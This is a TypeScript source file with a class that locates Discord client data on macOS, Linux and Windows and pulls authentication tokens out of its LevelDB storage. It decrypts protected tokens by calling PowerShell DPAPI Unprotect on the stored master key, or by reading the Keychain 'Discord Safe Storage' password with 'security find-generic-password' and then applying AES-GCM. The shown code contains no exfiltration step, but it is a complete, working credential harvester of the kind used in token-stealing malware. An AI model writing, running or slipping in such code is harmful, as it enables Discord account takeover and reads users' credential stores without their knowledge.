import { execSync } from 'node:child_process'
import { createDecipheriv, pbkdf2Sync } from 'node:crypto'
import { existsSync, readdirSync, readFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { join } from 'node:path'

export interface ExtractedDiscordToken {
  token: string
}

type DiscordVariant = 'stable' | 'canary' | 'ptb'

interface KeychainVariant {
  service: string
  account: string
}

const TOKEN_REGEX = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/
const MFA_TOKEN_REGEX = /mfa\.[\w-]{84}/
const ENCRYPTED_PREFIX = 'dQw4w9WgXcQ:'

export class DiscordTokenExtractor {
  private platform: NodeJS.Platform

  constructor(platform?: NodeJS.Platform) {
    this.platform = platform ?? process.platform
  }

  getDiscordDirs(): string[] {
    switch (this.platform) {
      case 'darwin':
        return [
          join(homedir(), 'Library', 'Application Support', 'Discord'),
          join(homedir(), 'Library', 'Application Support', 'discordcanary'),
          join(homedir(), 'Library', 'Application Support', 'discordptb'),
        ]
      case 'linux':
        return [
          join(homedir(), '.config', 'discord'),
          join(homedir(), '.config', 'discordcanary'),
          join(homedir(), '.config', 'discordptb'),
        ]
      case 'win32': {
        const appdata = process.env.APPDATA || join(homedir(), 'AppData', 'Roaming')
        return [
          join(appdata, 'Discord'),
          join(appdata, 'discordcanary'),
          join(appdata, 'discordptb'),
        ]
      }
      default:
        return []
    }
  }

  getKeychainVariants(): KeychainVariant[] {
    return [
      { service: 'Discord Safe Storage', account: 'Discord' },
      { service: 'Discord Canary Safe Storage', account: 'Discord Canary' },
      { service: 'Discord PTB Safe Storage', account: 'Discord PTB' },
    ]
  }

  getVariantFromPath(path: string): DiscordVariant {
    const lowerPath = path.toLowerCase()
    if (lowerPath.includes('canary')) return 'canary'
    if (lowerPath.includes('ptb')) return 'ptb'
    return 'stable'
  }

  isValidToken(token: string): boolean {
    if (!token || token.length === 0) return false
    return TOKEN_REGEX.test(token) || MFA_TOKEN_REGEX.test(token)
  }

  isEncryptedToken(token: string): boolean {
    return token.startsWith(ENCRYPTED_PREFIX)
  }

  async extract(): Promise<ExtractedDiscordToken | null> {
    const dirs = this.getDiscordDirs()

    for (const dir of dirs) {
      if (!existsSync(dir)) continue

      const token = await this.extractFromDir(dir)
      if (token) {
        return { token }
      }
    }

    return null
  }

  private async extractFromDir(discordDir: string): Promise<string | null> {
    const levelDbPath = join(discordDir, 'Local Storage', 'leveldb')

    if (!existsSync(levelDbPath)) return null

    const tokens = this.extractTokensFromLDBFiles(levelDbPath, discordDir)
    return tokens.length > 0 ? tokens[0] : null
  }

  private extractTokensFromLDBFiles(dbPath: string, discordDir: string): string[] {
    const tokens: string[] = []

    try {
      const files = readdirSync(dbPath).filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))

      for (const file of files) {
        const filePath = join(dbPath, file)
        const content = readFileSync(filePath)
        const extracted = this.extractTokensFromBuffer(content, discordDir)
        tokens.push(...extracted)
      }
    } catch {
      return tokens
    }

    return [...new Set(tokens)]
  }

  private extractTokensFromBuffer(buffer: Buffer, discordDir: string): string[] {
    const tokens: string[] = []
    const content = buffer.toString('utf8')

    const encryptedMatches = content.match(new RegExp(`${ENCRYPTED_PREFIX}[A-Za-z0-9+/=]+`, 'g'))
    if (encryptedMatches) {
      for (const match of encryptedMatches) {
        try {
          const decrypted = this.decryptToken(match, discordDir)
          if (decrypted && this.isValidToken(decrypted)) {
            tokens.push(decrypted)
          }
        } catch {}
      }
    }

    const standardMatches = content.match(TOKEN_REGEX)
    if (standardMatches) {
      for (const match of standardMatches) {
        if (this.isValidToken(match)) {
          tokens.push(match)
        }
      }
    }

    const mfaMatches = content.match(MFA_TOKEN_REGEX)
    if (mfaMatches) {
      for (const match of mfaMatches) {
        tokens.push(match)
      }
    }

    return tokens
  }

  private decryptToken(encryptedToken: string, discordDir: string): string | null {
    if (!encryptedToken.startsWith(ENCRYPTED_PREFIX)) return null

    const encryptedData = Buffer.from(encryptedToken.substring(ENCRYPTED_PREFIX.length), 'base64')

    if (this.platform === 'win32') {
      return this.decryptWindowsToken(encryptedData, discordDir)
    } else if (this.platform === 'darwin') {
      return this.decryptMacToken(encryptedData, discordDir)
    }

    return null
  }

  private decryptWindowsToken(encryptedData: Buffer, discordDir: string): string | null {
    try {
      const localStatePath = join(discordDir, 'Local State')
      if (!existsSync(localStatePath)) return null

      const localState = JSON.parse(readFileSync(localStatePath, 'utf8'))
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64')

      const dpapiBlobKey = encryptedKey.subarray(5)
      const masterKey = this.decryptDPAPI(dpapiBlobKey)
      if (!masterKey) return null

      return this.decryptAESGCM(encryptedData, masterKey)
    } catch {
      return null
    }
  }

  private decryptDPAPI(encryptedBlob: Buffer): Buffer | null {
    try {
      const b64 = encryptedBlob.toString('base64')
      const psScript = `
        Add-Type -AssemblyName System.Security
        $bytes = [Convert]::FromBase64String('${b64}')
        $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser')
        [Convert]::ToBase64String($decrypted)
      `.replace(/\n/g, ' ')

      const result = execSync(`powershell -Command "${psScript}"`, { encoding: 'utf8' })
      return Buffer.from(result.trim(), 'base64')
    } catch {
      return null
    }
  }

  private decryptMacToken(encryptedData: Buffer, discordDir: string): string | null {
    const variant = this.getVariantFromPath(discordDir)
    const keychainVariant = this.getKeychainVariants().find((v) => {
      if (variant === 'stable') return v.account === 'Discord'
      if (variant === 'canary') return v.account === 'Discord Canary'
      if (variant === 'ptb') return v.account === 'Discord PTB'
      return false
    })

    if (!keychainVariant) return null

    try {
      const password = execSync(
        `security find-generic-password -s "${keychainVariant.service}" -a "${keychainVariant.account}" -w 2>/dev/null`,
        { encoding: 'utf8' }
      ).trim()

      const key = pbkdf2Sync(password, 'saltysalt', 1003, 32, 'sha1')
      return this.decryptAESGCM(encryptedData, key)
    } catch {
      return null
    }
  }

  private decryptAESGCM(encryptedData: Buffer, key: Buffer): string | null {
    try {
      const iv = encryptedData.subarray(3, 15)
      const authTag = encryptedData.subarray(-16)
      const ciphertext = encryptedData.subarray(15, -16)

      const decipher = createDecipheriv('aes-256-gcm', key, iv)
      decipher.setAuthTag(authTag)

      const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()])
      return decrypted.toString('utf8')
    } catch {
      return null
    }
  }
}
